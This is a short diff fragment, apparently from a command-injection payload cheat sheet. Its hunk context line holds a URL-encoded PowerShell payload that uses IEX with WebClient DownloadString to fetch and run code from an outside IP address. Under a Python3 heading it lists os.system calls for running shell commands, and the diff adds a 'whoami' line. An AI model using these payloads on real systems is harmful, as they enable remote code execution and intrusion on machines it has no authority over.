@@ -22,4 +22,5 @@ urlencode(git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.1
 ### Python3
 ```
 __import__('os').system('cmd')
+os.system("whoami")
 ```
